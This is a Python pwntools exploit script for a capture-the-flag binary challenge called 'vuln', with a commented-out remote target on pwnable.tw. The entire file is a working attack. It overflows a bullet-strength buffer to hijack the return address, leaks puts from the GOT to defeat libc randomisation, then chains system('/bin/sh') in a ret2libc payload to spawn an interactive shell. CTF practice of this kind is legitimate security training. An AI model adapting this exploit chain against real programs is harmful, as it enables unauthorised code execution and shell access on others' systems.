#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="DEBUG")
p = elf.process()
gdb.attach(p, """b *main+105""")
# call power_up()
# p = remote('chall.pwnable.tw', ' 10103')


def create(name):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendafter(b"of bullet :", name)
    p.recvuntil(b"Good luck !!\n")


def power_up(name):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendafter(b"of bullet :", name)
    p.recvuntil(b"Enjoy it !\n")


def beat():
    p.sendlineafter(b"Your choice :", b"3")


# leak libc address
create(b"A" * 0x2F)
power_up(b"B")
payload = b"\xff\xff\xff" + b"C" * 4
payload += p32(elf.symbols["puts"]) + p32(elf.symbols["main"]) + p32(elf.got["puts"])
power_up(payload)
beat()

p.recvuntil(b"Oh ! You win !!\n")
puts_libc = u32(p.recv(4))
libc.address = puts_libc - libc.symbols["puts"]
log.success("Addr puts LIBC:      " + hex(libc.symbols["puts"]))
log.success("Addr LIBC base:      " + hex(libc.address))
log.success("Addr system LIBC:    " + hex(libc.symbols["system"]))
log.success('Addr "/bin/sh" LIBC: ' + hex(next(libc.search(b"/bin/sh"))))

# ret2libc
create(b"A" * 0x2F)
power_up(b"B")
payload = b"\xff\xff\xff" + b"C" * 4
payload += (
    p32(libc.symbols["system"])
    + p32(libc.symbols["exit"])
    + p32(next(libc.search(b"/bin/sh")))
)
power_up(payload)
beat()

p.interactive()
